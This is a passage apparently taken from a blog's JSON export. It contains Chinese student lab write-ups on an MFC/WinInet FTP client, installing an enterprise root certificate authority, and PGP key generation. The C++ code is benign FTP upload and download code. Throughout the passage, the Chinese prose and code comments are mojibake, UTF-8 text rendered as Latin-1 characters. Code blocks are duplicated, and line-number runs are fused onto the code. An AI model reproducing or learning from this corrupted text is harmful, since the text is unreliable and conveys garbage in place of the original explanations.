æœåŠ¡å™¨ï¼Œå¯ä»¥è·çŸ¥æˆ–è®¾ç½®å½“å‰ç›®å½•ï¼Œä¸‹è½½æˆ–ä¸Šä¼ æ–‡ä»¶ï¼Œåˆ›å»ºæˆ–åˆ é™¤ç›®å½•ï¼Œé‡å‘½å æ–‡ä»¶æˆ–ç›®å½•ç­‰ã€‚ (4)åˆ›å»ºæ–‡ä»¶æ£€ç´¢ç±»å¯¹è±¡ï¼Œå¯¹æœåŠ¡å™¨è¿›è¡Œæ£€ç´¢ã€‚ (5)å¦‚æœéœ€è¦ä½¿ç”¨å¼‚æ­¥æ“ä½œæ¨¡å¼ï¼Œå¯ä»¥é‡è½½ CInternetSession ç±»çš„ OnStatusCallback å‡½æ•°ï¼Œå¹¶ å¯åŠ¨åº”ç”¨ç¨‹åºï¼Œä½¿ç”¨çŠ¶æ€å›è°ƒæœºåˆ¶ï¼Œé‡è½½ç›¸å…³å‡½æ•°ï¼ŒåŠ å…¥è‡ªå·±çš„ä»£ç ã€‚ (6)å¦‚æœè¿˜æƒ³æ›´ç´§å¯†åœ°æ§åˆ¶å¯¹æœåŠ¡å™¨æ–‡ä»¶çš„è®¿é—®ï¼Œå¯ä»¥è¿›ä¸€æ­¥åˆ›å»ºæ–‡ä»¶ç±»å¯¹è±¡å®ä¾‹ï¼Œå®Œæˆæ–‡ ä»¶æŸ¥æ‰¾æˆ–æ–‡ä»¶è¯»å†™æ“ä½œã€‚ (7)åˆ›å»º CInternetException ç±»å¯¹è±¡å®ä¾‹ï¼Œå¤„ç†é”™è¯¯ã€‚ (8)å…³é—­å„ç§ç±»ï¼Œå°†èµ„æºé‡Šæ”¾ç»™ç³»ç»Ÿã€‚ å®éªŒè¿‡ç¨‹1.ä½¿ç”¨ MFC AppWizard åˆ›å»ºåº”ç”¨ç¨‹åºæ¡†æ¶åº”ç”¨ç¨‹åºç±»:CFtpAppï¼Œå¯¹åº”çš„æ–‡ä»¶æ˜¯ Ftp.h å’Œ Ftp.cppã€‚ å¯¹è¯æ¡†ç±»:CFtpDlgï¼Œå¯¹åº”çš„æ–‡ä»¶æ˜¯ FtpDlg.h å’Œ FtpDlg.cppã€‚ 2.ä¸ºå¯¹è¯æ¡†æ·»åŠ æ§ä»¶ 3.å®šä¹‰æ§ä»¶çš„æˆå‘˜å˜é‡ 4.æ·»åŠ æˆå‘˜å˜é‡çš„åˆå§‹åŒ–ä»£ç åœ¨ FtpDlg.cpp æ–‡ä»¶çš„ OnInitDialog( )å‡½æ•°ä¸­æ·»åŠ æˆå‘˜å˜é‡çš„åˆå§‹åŒ–ä»£ç ã€‚å¯¹æœåŠ¡å™¨åã€ç™»å½•ç”¨æˆ·åå’Œç™»å½•å£ä»¤çš„æ§ä»¶å˜é‡èµ‹åˆå€¼ã€‚ 1234567// TODO: åœ¨æ­¤æ·»åŠ é¢å¤–çš„åˆå§‹åŒ–ä»£ç  m_strFtp = _T(&quot;&quot;); m_strName = _T(&quot;&quot;); m_strPwd = _T(&quot;&quot;); m_strPwd = _T(&quot;&quot;); UpdateData(FALSE); return TRUE; // é™¤éå°†ç„¦ç‚¹è®¾ç½®åˆ°æ§ä»¶ï¼Œå¦åˆ™è¿”å› TRUE 5.ä¸ºå¯¹è¯æ¡†ä¸­çš„æ§ä»¶å¯¹è±¡æ·»åŠ äº‹ä»¶å“åº”å‡½æ•° 6.ä¸º CFtpDlg ç±»æ·»åŠ å…¶ä»–çš„æˆå‘˜å‡½æ•°123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102BOOL CFtpDlg::Download(CString strSName, CString strDName)&#123; // TODO: åœ¨æ­¤å¤„æ·»åŠ å®ç°ä»£ç . CInternetSession* pSession; //å®šä¹‰ä¼šè¯å¯¹è±¡å˜é‡æŒ‡é’ˆ CFtpConnection* pConnection; //å®šä¹‰è¿æ¥å¯¹è±¡å˜é‡æŒ‡é’ˆ pConnection = NULL; //åˆ›å»ºInternetä¼šè¯å¯¹è±¡ pSession = new CInternetSession(AfxGetAppName(), 1, PRE_CONFIG_INTERNET_ACCESS); try &#123; //å»ºç«‹FTPè¿æ¥ pConnection = pSession-&gt;GetFtpConnection(m_strFtp, m_strName, m_strPwd); &#125; catch (CInternetException* e) &#123; //é”™è¯¯å¤„ç† e-&gt;Delete(); pConnection = NULL; return FALSE; &#125; if (pConnection != NULL) &#123; //ä¸‹è½½æ–‡ä»¶ if (!pConnection-&gt;GetFile(strSName, strDName)) &#123; //ä¸‹è½½æ–‡ä»¶é”™è¯¯ pConnection-&gt;Close(); delete pConnection; delete pSession; return FALSE; &#125; &#125; //æ¸…é™¤å¯¹è±¡ if (pConnection != NULL) &#123; pConnection-&gt;Close(); delete pConnection; &#125; delete pSession; return TRUE;&#125;BOOL CFtpDlg::Upload(CString strSName, CString strDName)&#123; // TODO: åœ¨æ­¤å¤„æ·»åŠ å®ç°ä»£ç . CInternetSession* pSession; CFtpConnection* pConnection; pConnection = NULL; //åˆ›å»ºInternetä¼šè¯ pSession = new CInternetSession(AfxGetAppName(), 1, PRE_CONFIG_INTERNET_ACCESS); try &#123; //å»ºç«‹FTPè¿æ¥ pConnection = pSession-&gt;GetFtpConnection(m_strFtp, m_strName, m_strPwd); &#125; catch (CInternetException* e) &#123; //é”™è¯¯å¤„ç† e-&gt;Delete(); pConnection = NULL; return FALSE; &#125; if (pConnection != NULL) &#123; //ä¸Šä¼ æ–‡ä»¶ if (!pConnection-&gt;PutFile(strSName, strDName)) &#123; //ä¸Šä¼ æ–‡ä»¶é”™è¯¯ pConnection-&gt;Close(); delete pConnection; delete pSession; return FALSE; &#125; &#125; //æ¸…é™¤å¯¹è±¡ if (pConnection != NULL) &#123; pConnection-&gt;Close(); delete pConnection; &#125; delete pSession; return TRUE;&#125; 7.æ‰‹å·¥æ·»åŠ åŒ…å«è¯­å¥åœ¨ CFtpDlg ç±»çš„ FtpDlg.cpp æ–‡ä»¶ä¸­æ·»åŠ å¯¹äº Afxinet.h çš„åŒ…å«å‘½ä»¤ï¼Œæ¥è·å¾—å¯¹äº MFC WinInet ç±»çš„æ”¯æŒã€‚ 8.æ·»åŠ äº‹ä»¶å‡½æ•°å’Œæˆå‘˜å‡½æ•°çš„ä»£ç FTP.h 123456789101112131415161718192021222324252627282930313233// Ftp.h: PROJECT_NAME åº”ç”¨ç¨‹åºçš„ä¸»å¤´æ–‡ä»¶//#pragma once#ifndef __AFXWIN_H__ #error &quot;include &#x27;pch.h&#x27; before including this file for PCH&quot;#endif#include &quot;resource.h&quot; // ä¸»ç¬¦å·// CFtpApp:// æœ‰å…³æ­¤ç±»çš„å®ç°ï¼Œè¯·å‚é˜… Ftp.cpp//class CFtpApp : public CWinApp&#123;public: CFtpApp();// é‡å†™public: virtual BOOL InitInstance();// å®ç° DECLARE_MESSAGE_MAP()&#125;;extern CFtpApp theApp; FTP.cpp 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108// Ftp.cpp: å®šä¹‰åº”ç”¨ç¨‹åºçš„ç±»è¡Œä¸ºã€‚//#include &quot;pch.h&quot;#include &quot;framework.h&quot;#include &quot;Ftp.h&quot;#include &quot;FtpDlg.h&quot;#ifdef _DEBUG#define new DEBUG_NEW#endif// CFtpAppBEGIN_MESSAGE_MAP(CFtpApp, CWinApp) ON_COMMAND(ID_HELP, &amp;CWinApp::OnHelp)END_MESSAGE_MAP()// CFtpApp æ„é€ CFtpApp::CFtpApp()&#123; // æ”¯æŒé‡æ–°å¯åŠ¨ç®¡ç†å™¨ m_dwRestartManagerSupportFlags = AFX_RESTART_MANAGER_SUPPORT_RESTART; // TODO: åœ¨æ­¤å¤„æ·»åŠ æ„é€ ä»£ç ï¼Œ // å°†æ‰€æœ‰é‡è¦çš„åˆå§‹åŒ–æ”¾ç½®åœ¨ InitInstance ä¸­&#125;// å”¯ä¸€çš„ CFtpApp å¯¹è±¡CFtpApp theApp;// CFtpApp åˆå§‹åŒ–BOOL CFtpApp::InitInstance()&#123; // å¦‚æœä¸€ä¸ªè¿è¡Œåœ¨ Windows XP ä¸Šçš„åº”ç”¨ç¨‹åºæ¸…å•æŒ‡å®šè¦ // ä½¿ç”¨ ComCtl32.dll ç‰ˆæœ¬ 6 æˆ–æ›´é«˜ç‰ˆæœ¬æ¥å¯ç”¨å¯è§†åŒ–æ–¹å¼ï¼Œ //åˆ™éœ€è¦ InitCommonControlsEx()ã€‚ å¦åˆ™ï¼Œå°†æ— æ³•åˆ›å»ºçª—å£ã€‚ INITCOMMONCONTROLSEX InitCtrls; InitCtrls.dwSize = sizeof(InitCtrls); // å°†å®ƒè®¾ç½®ä¸ºåŒ…æ‹¬æ‰€æœ‰è¦åœ¨åº”ç”¨ç¨‹åºä¸­ä½¿ç”¨çš„ // å…¬å…±æ§ä»¶ç±»ã€‚ InitCtrls.dwICC = ICC_WIN95_CLASSES; InitCommonControlsEx(&amp;InitCtrls); CWinApp::InitInstance(); AfxEnableControlContainer(); // åˆ›å»º shell ç®¡ç†å™¨ï¼Œä»¥é˜²å¯¹è¯æ¡†åŒ…å« // ä»»ä½• shell æ ‘è§†å›¾æ§ä»¶æˆ– shell åˆ—è¡¨è§†å›¾æ§ä»¶ã€‚ CShellManager *pShellManager = new CShellManager; // æ¿€æ´»â€œWindows Nativeâ€è§†è§‰ç®¡ç†å™¨ï¼Œä»¥ä¾¿åœ¨ MFC æ§ä»¶ä¸­å¯ç”¨ä¸»é¢˜ CMFCVisualManager::SetDefaultManager(RUNTIME_CLASS(CMFCVisualManagerWindows)); // æ ‡å‡†åˆå§‹åŒ– // å¦‚æœæœªä½¿ç”¨è¿™äº›åŠŸèƒ½å¹¶å¸Œæœ›å‡å° // æœ€ç»ˆå¯æ‰§è¡Œæ–‡ä»¶çš„å¤§å°ï¼Œåˆ™åº”ç§»é™¤ä¸‹åˆ— // ä¸éœ€è¦çš„ç‰¹å®šåˆå§‹åŒ–ä¾‹ç¨‹ // æ›´æ”¹ç”¨äºå­˜å‚¨è®¾ç½®çš„æ³¨å†Œè¡¨é¡¹ // TODO: åº”é€‚å½“ä¿®æ”¹è¯¥å­—ç¬¦ä¸²ï¼Œ // ä¾‹å¦‚ä¿®æ”¹ä¸ºå…¬å¸æˆ–ç»„ç»‡å SetRegistryKey(_T(&quot;åº”ç”¨ç¨‹åºå‘å¯¼ç”Ÿæˆçš„æœ¬åœ°åº”ç”¨ç¨‹åº&quot;)); CFtpDlg dlg; m_pMainWnd = &amp;dlg; INT_PTR nResponse = dlg.DoModal(); if (nResponse == IDOK) &#123; // TODO: åœ¨æ­¤æ”¾ç½®å¤„ç†ä½•æ—¶ç”¨ // â€œç¡®å®šâ€æ¥å…³é—­å¯¹è¯æ¡†çš„ä»£ç  &#125; else if (nResponse == IDCANCEL) &#123; // TODO: åœ¨æ­¤æ”¾ç½®å¤„ç†ä½•æ—¶ç”¨ // â€œå–æ¶ˆâ€æ¥å…³é—­å¯¹è¯æ¡†çš„ä»£ç  &#125; else if (nResponse == -1) &#123; TRACE(traceAppMsg, 0, &quot;è­¦å‘Š: å¯¹è¯æ¡†åˆ›å»ºå¤±è´¥ï¼Œåº”ç”¨ç¨‹åºå°†æ„å¤–ç»ˆæ­¢ã€‚\\n&quot;); TRACE(traceAppMsg, 0, &quot;è­¦å‘Š: å¦‚æœæ‚¨åœ¨å¯¹è¯æ¡†ä¸Šä½¿ç”¨ MFC æ§ä»¶ï¼Œåˆ™æ— æ³• #define _AFX_NO_MFC_CONTROLS_IN_DIALOGSã€‚\\n&quot;); &#125; // åˆ é™¤ä¸Šé¢åˆ›å»ºçš„ shell ç®¡ç†å™¨ã€‚ if (pShellManager != nullptr) &#123; delete pShellManager; &#125;#if !defined(_AFXDLL) &amp;&amp; !defined(_AFX_NO_MFC_CONTROLS_IN_DIALOGS) ControlBarCleanUp();#endif // ç”±äºå¯¹è¯æ¡†å·²å…³é—­ï¼Œæ‰€ä»¥å°†è¿”å› FALSE ä»¥ä¾¿é€€å‡ºåº”ç”¨ç¨‹åºï¼Œ // è€Œä¸æ˜¯å¯åŠ¨åº”ç”¨ç¨‹åºçš„æ¶ˆæ¯æ³µã€‚ return FALSE;&#125; FtpDlg.h 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455// FtpDlg.h: å¤´æ–‡ä»¶//#pragma once// CFtpDlg å¯¹è¯æ¡†class CFtpDlg : public CDialogEx&#123;// æ„é€ public: CFtpDlg(CWnd* pParent = nullptr); // æ ‡å‡†æ„é€ å‡½æ•°// å¯¹è¯æ¡†æ•°æ®#ifdef AFX_DESIGN_TIME enum &#123; IDD = IDD_FTP_DIALOG &#125;;#endif protected: virtual void DoDataExchange(CDataExchange* pDX); // DDX/DDV æ”¯æŒ// å®ç°protected: HICON m_hIcon; // ç”Ÿæˆçš„æ¶ˆæ¯æ˜ å°„å‡½æ•° virtual BOOL OnInitDialog(); afx_msg void OnSysCommand(UINT nID, LPARAM lParam); afx_msg void OnPaint(); afx_msg HCURSOR OnQueryDragIcon(); DECLARE_MESSAGE_MAP()public: CStatic m_staFtp; CStatic m_staName; CStatic m_staPwd; CEdit m_editFtp; CString m_strFtp; CEdit m_editName; CString m_strName; CEdit m_editPwd; CString m_strPwd; CButton m_btnQuery; CButton m_btnDownload; CButton m_btnUpload; CListBox m_listFile; afx_msg void OnQuery(); afx_msg void OnDownload(); afx_msg void OnUpload(); afx_msg void OnSelchangeListFile(); BOOL Download(CString strSName, CString strDName); BOOL Upload(CString strSName, CString strDName);&#125;; ftpDlg.cpp 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102BOOL CFtpDlg::Download(CString strSName, CString strDName)&#123; // TODO: åœ¨æ­¤å¤„æ·»åŠ å®ç°ä»£ç . CInternetSession* pSession; //å®šä¹‰ä¼šè¯å¯¹è±¡å˜é‡æŒ‡é’ˆ CFtpConnection* pConnection; //å®šä¹‰è¿æ¥å¯¹è±¡å˜é‡æŒ‡é’ˆ pConnection = NULL; //åˆ›å»ºInternetä¼šè¯å¯¹è±¡ pSession = new CInternetSession(AfxGetAppName(), 1, PRE_CONFIG_INTERNET_ACCESS); try &#123; //å»ºç«‹FTPè¿æ¥ pConnection = pSession-&gt;GetFtpConnection(m_strFtp, m_strName, m_strPwd); &#125; catch (CInternetException* e) &#123; //é”™è¯¯å¤„ç† e-&gt;Delete(); pConnection = NULL; return FALSE; &#125; if (pConnection != NULL) &#123; //ä¸‹è½½æ–‡ä»¶ if (!pConnection-&gt;GetFile(strSName, strDName)) &#123; //ä¸‹è½½æ–‡ä»¶é”™è¯¯ pConnection-&gt;Close(); delete pConnection; delete pSession; return FALSE; &#125; &#125; //æ¸…é™¤å¯¹è±¡ if (pConnection != NULL) &#123; pConnection-&gt;Close(); delete pConnection; &#125; delete pSession; return TRUE;&#125;BOOL CFtpDlg::Upload(CString strSName, CString strDName)&#123; // TODO: åœ¨æ­¤å¤„æ·»åŠ å®ç°ä»£ç . CInternetSession* pSession; CFtpConnection* pConnection; pConnection = NULL; //åˆ›å»ºInternetä¼šè¯ pSession = new CInternetSession(AfxGetAppName(), 1, PRE_CONFIG_INTERNET_ACCESS); try &#123; //å»ºç«‹FTPè¿æ¥ pConnection = pSession-&gt;GetFtpConnection(m_strFtp, m_strName, m_strPwd); &#125; catch (CInternetException* e) &#123; //é”™è¯¯å¤„ç† e-&gt;Delete(); pConnection = NULL; return FALSE; &#125; if (pConnection != NULL) &#123; //ä¸Šä¼ æ–‡ä»¶ if (!pConnection-&gt;PutFile(strSName, strDName)) &#123; //ä¸Šä¼ æ–‡ä»¶é”™è¯¯ pConnection-&gt;Close(); delete pConnection; delete pSession; return FALSE; &#125; &#125; //æ¸…é™¤å¯¹è±¡ if (pConnection != NULL) &#123; pConnection-&gt;Close(); delete pConnection; &#125; delete pSession; return TRUE;&#125; 9.è¿›è¡Œæµ‹è¯• éœ€è¦å…ˆåœ¨æœ¬æœºå¼€å¯FTPæœåŠ¡å™¨ filezilla severå¼€å¯FTPæœåŠ¡ã€‚ ä¸‹è½½é“¾æ¥ï¼š https://gryffinbit.lanzous.com/i5ISij3kh6f å®‰è£…åï¼Œç‚¹å‡»editï¼Œsettingè¿›è¡ŒåŸºæœ¬é…ç½®ã€‚14147ä¸ºé»˜è®¤ç«¯å£ åœ¨filezillaè®¾ç½®ç”¨æˆ·ç«¯ã€‚ æ·»åŠ ä¸€ä¸ªç”¨æˆ·ã€‚ åœ¨æœåŠ¡å™¨åŸŸåæ–‡æœ¬æ¡†ä¸­è¾“å…¥â€œlocalhostâ€ï¼Œä¿æŒç™»å½•ç”¨æˆ·åå’Œå£ä»¤ä¸åˆšåˆšåˆ›å»ºçš„ç”¨æˆ·ä¸€è‡´ï¼Œå•å‡»â€œæŸ¥è¯¢â€æŒ‰é’®ï¼Œç”¨æˆ·å°†è·å¾— FTP æœåŠ¡å™¨çš„é»˜è®¤ç›®å½•ä¸‹çš„æ–‡ä»¶åå’Œç›®å½•åã€‚ å®éªŒç•Œé¢ç»“æœå±•ç¤ºç•Œé¢æ˜¾ç¤ºï¼š ä¸‹è½½æ–‡ä»¶ï¼š å®éªŒè¿‡ç¨‹ä¸­é‡åˆ°çš„é—®é¢˜å­—ç¬¦é—®é¢˜ï¼Œåœ¨å­—ç¬¦ä¸²å‰é¢ï¼ŒåŠ ä¸Š_T 1strFileName = _T(&quot;[&quot; )+ strFileName + _T(&quot;]&quot;);","categories":[{"name":"å®éªŒ","slug":"å®éªŒ","permalink":"https://gryffinbit.top/categories/%E5%AE%9E%E9%AA%8C/"},{"name":"ç½‘ç»œç¼–ç¨‹","slug":"å®éªŒ/ç½‘ç»œç¼–ç¨‹","permalink":"https://gryffinbit.top/categories/%E5%AE%9E%E9%AA%8C/%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B/"}],"tags":[{"name":"WinInet","slug":"WinInet","permalink":"https://gryffinbit.top/tags/WinInet/"},{"name":"MFC","slug":"MFC","permalink":"https://gryffinbit.top/tags/MFC/"}],"author":"Gryffinbit"},{"title":"ä¼ä¸šæ ¹CAçš„å®‰è£…å’Œä½¿ç”¨","slug":"ä¼ä¸šæ ¹CAçš„å®‰è£…å’Œä½¿ç”¨","date":"2020-12-07T14:48:02.000Z","updated":"2024-11-12T07:00:07.000Z","comments":true,"path":"2020/12/07/ä¼ä¸šæ ¹CAçš„å®‰è£…å’Œä½¿ç”¨/","permalink":"https://gryffinbit.top/2020/12/07/%E4%BC%81%E4%B8%9A%E6%A0%B9CA%E7%9A%84%E5%AE%89%E8%A3%85%E5%92%8C%E4%BD%BF%E7%94%A8/","excerpt":"","text":"ä¼ä¸šæ ¹CAçš„å®‰è£…å’Œä½¿ç”¨å®éªŒç›®çš„ï¼š ç†è§£CAè®¤è¯åŸç†åŠå…¶ç»“æ„ æŒæ¡Windows Server2003ç¯å¢ƒä¸‹ä¼ä¸šæ ¹è¯ä¹¦å®‰è£…å’Œä½¿ç”¨ å®éªŒç›®æ ‡ï¼š é€šè¿‡ç½‘ç»œå®‰å…¨æŠ€æœ¯å®éªŒè®¤è¯†ç½‘ç»œå®‰å…¨æŠ€æœ¯çš„åŸºæœ¬æ¦‚å¿µã€åŸç†å’ŒæŠ€æœ¯ï¼ŒæŒæ¡åŸºæœ¬çš„ç½‘ç»œå®‰å…¨å¸¸ç”¨å·¥å…·çš„ä½¿ç”¨æ–¹æ³•åŠåŸç†ã€‚åŠ æ·±å¯¹è¯¾å ‚ç†è®ºæ•™å­¦çš„ç†è§£ã€‚ åŸ¹å…»å®éªŒæŠ€èƒ½ã€åŠ¨æ‰‹èƒ½åŠ›å’Œåˆ†æé—®é¢˜ã€è§£å†³é—®é¢˜çš„èƒ½åŠ›ã€‚ å®éªŒå†…å®¹ï¼š ä¼ä¸šæ ¹CAçš„å®‰è£… Webæ–¹å¼ç”³è¯·å’Œå®‰è£…è¯ä¹¦ å®éªŒåŸç†ï¼š æ•°å­—è¯ä¹¦æ¦‚å¿µ å°†ç”¨æˆ·èº«ä»½IDä¸å…¶æ‰€æŒæœ‰çš„å…¬é’¥PKç»‘å®šï¼Œå†ç”±CAå¯¹è¯¥èº«ä»½åŠå¯¹åº”å…¬é’¥çš„ç»„åˆ{ID||PK}è¿›è¡Œæ•°å­—ç­¾åå¾—åˆ°Sï¼Œå°†{ç­¾åS||èº«ä»½ID||å…¬é’¥PK}åŠ ä»¥å­˜å‚¨ã€‚ CAè¯ä¹¦æœºæ„ è´Ÿè´£å‘æ”¾å’Œç®¡ç†æ•°å­—è¯ä¹¦ è·Ÿè¸ªè¯ä¹¦çŠ¶æ€ åœ¨è¯ä¹¦éœ€è¦æ’¤é”€æ—¶å‘å¸ƒè¯ä¹¦æ’¤é”€é€šçŸ¥ ç»´æŠ¤è¯ä¹¦æ¡£æ¡ˆå’Œè¯ä¹¦ç›¸å…³çš„å®¡è®¡ã€‚ å®éªŒç¯å¢ƒï¼šå®¿ä¸»æœºï¼š macOS Catalina è™šæ‹Ÿæœºï¼šWindows Sever 2003 å®éªŒè¿‡ç¨‹ï¼š ä¸€ï¼šä¼ä¸šæ ¹CAçš„å®‰è£… ğŸ‘‰å¯åŠ¨Active Directory ç”¨æˆ·å’Œè®¡ç®—æœºé¡¹ ğŸ‘‰æŒ‚è½½IOSé•œåƒ åœ¨è™šæ‹Ÿæœºçš„é€‰é¡¹ä¸­ï¼Œé€‰æ‹©IOSé•œåƒå¹¶è¿æ¥ ğŸ‘‰å®‰è£…IISæœåŠ¡ ğŸ‘‰æ·»åŠ è¯ä¹¦æœåŠ¡ æ§åˆ¶é¢æ¿ â†’ æ·»åŠ æˆ–åˆ é™¤ç¨‹åº â†’ Windowsç»„ä»¶æœåŠ¡ â†’ å¼€å¯è¯ä¹¦æœåŠ¡ å¡«å…¥CAè¦æ±‚çš„ä¿¡æ¯ ğŸ‘‰æŸ¥çœ‹è¯ä¹¦é¢å‘æœºæ„ï¼Œå¯åŠ¨&#x2F;åœæ­¢è¯ä¹¦æœåŠ¡ äºŒã€Webæ–¹å¼ç”³è¯·å’Œå®‰è£…è¯ä¹¦ ğŸ‘‰Serverä¸Šé¢å¼€å¯æµè§ˆå™¨ è®¿é—®ç½‘å€çš„æ—¶å€™ï¼Œæ ¹æ®æç¤ºï¼Œä¸€æ­¥æ­¥è®¾ç½® è¾“å…¥æœ¬æœºçš„ç”¨æˆ·åå’Œå¯†ç ï¼Œè¿›è¡Œè¿æ¥é…ç½® ğŸ‘‰è®¿é—®ç½‘é¡µï¼Œè‡ªåŠ¨é¢å‘è¯ä¹¦ ç½‘é¡µè®¿é—®http:&#x2F;&#x2F;æœ¬æœºIP&#x2F;certsrv ç”³è¯·ä¸€ä¸ªè¯ä¹¦â†’ ç”¨æˆ·è¯ä¹¦ â†’ æäº¤ â†’ è·å¾—è¯ä¹¦ ğŸ‘‰å®‰è£…å’ŒæŸ¥çœ‹è¯ä¹¦ æ‰“å¼€æ§åˆ¶å° â†’ mmc â†’ æ–‡ä»¶ â†’ æ·»åŠ &#x2F;åˆ é™¤ç®¡ç†å•å…ƒ â†’ æ·»åŠ è¯ä¹¦ æŸ¥çœ‹è¯ä¹¦ä¿¡æ¯ ä¸‰ã€WebæœåŠ¡å™¨è¯ä¹¦çš„ç”³è¯·å’Œå®‰è£… ğŸ‘‰é…ç½®WebæœåŠ¡å™¨ ç®¡ç†å·¥å…· â†’ Internetä¿¡æ¯ç®¡ç† â†’ IIS ğŸ‘‰æ–°å»ºç½‘ç«™ å³é”®ç½‘ç«™ï¼ˆæ³¨æ„IPåœ°å€ï¼Œè¯»å†™æƒé™ï¼‰ ğŸ‘‰Webè¯ä¹¦æœåŠ¡å¯¼å‘ å³é”®å±æ€§ â†’ ç›®å½•å®‰å…¨æ€§ â†’ è¯ä¹¦æœåŠ¡å™¨ â†’ æ–°å»ºè¯ä¹¦","categories":[{"name":"å®éªŒ","slug":"å®éªŒ","permalink":"https://gryffinbit.top/categories/%E5%AE%9E%E9%AA%8C/"},{"name":"ç½‘ç»œå®‰å…¨æŠ€æœ¯","slug":"å®éªŒ/ç½‘ç»œå®‰å…¨æŠ€æœ¯","permalink":"https://gryffinbit.top/categories/%E5%AE%9E%E9%AA%8C/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"CA","slug":"CA","permalink":"https://gryffinbit.top/tags/CA/"},{"name":"è¯ä¹¦","slug":"è¯ä¹¦","permalink":"https://gryffinbit.top/tags/%E8%AF%81%E4%B9%A6/"}],"author":"Gryffinbit"},{"title":"ä½¿ç”¨PGPè¿›è¡Œå…¬é’¥ä½“åˆ¶çš„é€šä¿¡","slug":"ä½¿ç”¨PGPè¿›è¡Œå…¬é’¥ä½“åˆ¶çš„é€šä¿¡","date":"2020-12-06T16:55:13.000Z","updated":"2024-11-12T07:00:05.000Z","comments":true,"path":"2020/12/07/ä½¿ç”¨PGPè¿›è¡Œå…¬é’¥ä½“åˆ¶çš„é€šä¿¡/","permalink":"https://gryffinbit.top/2020/12/07/%E4%BD%BF%E7%94%A8PGP%E8%BF%9B%E8%A1%8C%E5%85%AC%E9%92%A5%E4%BD%93%E5%88%B6%E7%9A%84%E9%80%9A%E4%BF%A1/","excerpt":"","text":"åŠ å¯†ç»¼åˆå®éªŒå®éªŒé™„ä»¶ä¸‹è½½åœ°å€ï¼šhttps://gryffinbit.lanzous.com/i5ISij3kh6f å®éªŒç›®çš„ï¼š æŒæ¡åŠ è§£å¯†çš„åŸç†å’Œå…¬é’¥ä½“åˆ¶ã€‚ äº†è§£PGPè½¯ä»¶çš„åŠŸèƒ½ä¸ä½¿ç”¨ã€‚ æŒæ¡PGPçš„åŠ å¯†åŸç†ã€‚ å®éªŒç¯å¢ƒï¼šVMware Win10è™šæ‹Ÿæœº å®éªŒè¿‡ç¨‹ä¸æ­¥éª¤ï¼šä¸€ã€PGPåŠ å¯†è½¯ä»¶çš„å®‰è£…â€‹ äºŒã€ç”Ÿæˆå¯†é’¥ è¦ä½¿ç”¨è¯¥è½¯ä»¶è¿›è¡ŒåŠ å¯†çš„è¯ï¼Œé¦–å…ˆè¦ç”Ÿæˆä¸€å¯¹å¯†é’¥ã€‚ä¹Ÿå°±æ˜¯ä¸€ä¸ªå…¬é’¥å’Œä¸€ä¸ªç§é’¥ã€‚å…¶ä¸­å…¬é’¥æ˜¯å‘é€ç»™åˆ«äººç”¨æ¥åŠ å¯†é’¥å‘é€ç»™è‡ªå·±çš„æ–‡ä»¶çš„ï¼Œç§é’¥æ˜¯è‡ªå·±ä¿å­˜ï¼Œç”¨äºè§£å¯†åˆ«äººç”¨å…¬é’¥åŠ å¯†çš„æ–‡ä»¶ï¼Œæˆ–è€…èµ·æ•°å­—ç­¾åçš„ä½œç”¨ã€‚ PGPæœ‰å¾ˆå¥½çš„åˆ›å»ºå¯†é’¥å¯¹çš„å‘å¯¼ï¼Œè·Ÿç€å‘å¯¼å¾ˆå®¹æ˜“ç”Ÿæˆä¸€å¯¹å¯†é’¥ã€‚æ¯ä¸€å¯¹å¯†é’¥éƒ½å¯¹åº”ç€ä¸€ä¸ªç¡®å®šçš„ç”¨æˆ·ã€‚ç”¨æˆ·åä¸ä¸€å®šè¦çœŸå®ï¼Œä½†æ˜¯è¦æ–¹ä¾¿é€šä¿¡è€…çœ‹åˆ°è¯¥ç”¨æˆ·åèƒ½çŸ¥é“è¿™ä¸ªç”¨æˆ·åå¯¹åº”çš„çœŸå®çš„äººï¼›é‚®ä»¶åœ°å€ä¹Ÿæ˜¯ä¸€æ ·ä¸éœ€è¦çœŸå®ï¼Œä½†æ˜¯è¦èƒ½æ–¹ä¾¿ä¸ä½ é€šä¿¡çš„äººåœ¨å¤šä¸ªå…¬é’¥ä¸­å¿«é€Ÿçš„æ‰¾å‡ºä½ çš„å…¬é’¥ã€‚ å¯†é’¥å¯¹çš„ç§é’¥è¿˜å¿…é¡»è¿›ä¸€æ­¥ç”¨å¯†ç åŠ å¯†ï¼Œè¿™ä¸ªåŠ å¯†æ˜¯å¯¹ä½ çš„ç§é’¥åŠ å¯†ã€‚è¿™ä¸ªå¯†ç éå¸¸é‡è¦ï¼Œåˆ‡è®°ä¸è¦æ³„æ¼äº†ï¼Œä¸ºå®‰å…¨èµ·è§ï¼Œå¯†ç é•¿åº¦è‡³å°‘8ä½ï¼Œè€Œä¸”åº”è¯¥åŒ…å«éå­—æ¯çš„å­—ç¬¦ã€‚ â€‹ â€‹ ä¸‰ã€å¯¼å‡ºå¹¶å‘é€å…¬é’¥ç°åœ¨å°†è¿™ä¸ªå¯†é’¥å¯¼å‡ºï¼Œåœ¨è¿™ä¸ªå¯†é’¥ä¸Šå³å‡»é€‰æ‹©â€œExportâ€¦â€ï¼Œå‡ºç°å¦‚ä¸‹ç•Œé¢ï¼š â€‹ å¯¼å‡ºå¯†é’¥åï¼ŒæŠŠå¯†é’¥æ–‡ä»¶ä¿å­˜åœ¨ç¡¬ç›˜ä¸Šï¼Œå¹¶æŠŠå…¬é’¥æ–‡ä»¶å‘é€åˆ°ä¸€ä¸ªâ€œå…¬é’¥ç®¡ç†â€æ–‡ä»¶å¤¹ï¼ˆä¾‹å¦‚QQç¾¤æ–‡ä»¶ä¸­å»ºä¸€ä¸ªå…¬é’¥ç®¡ç†æ–‡ä»¶å¤¹ï¼‰ï¼Œå¤§å®¶çš„å…¬é’¥æ•´ç†åéƒ½æ”¾åœ¨è¿™ä¸ªå¤¹é‡Œã€‚ 